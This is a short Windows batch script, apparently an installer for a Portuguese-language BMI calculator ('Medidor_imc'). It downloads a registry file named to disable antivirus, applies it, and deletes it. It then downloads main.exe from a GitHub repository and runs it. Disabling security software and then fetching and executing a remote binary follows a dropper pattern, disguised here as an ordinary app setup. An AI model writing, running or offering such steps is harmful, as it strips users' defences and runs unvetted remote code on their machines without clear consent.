cd %USERPROFILE%\Downloads
mkdir Medidor_imc
cd Medidor_imc
type nul > people.json
curl -o desativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/entrega_edu_fis/main/desativar_antivirus.reg
curl -o ativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/entrega_edu_fis/main/ativar_antivirus.reg
start desativar_antivirus.reg
del desativar_antivirus.reg
curl -L -o main.exe https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/main.exe
start main.exe
exit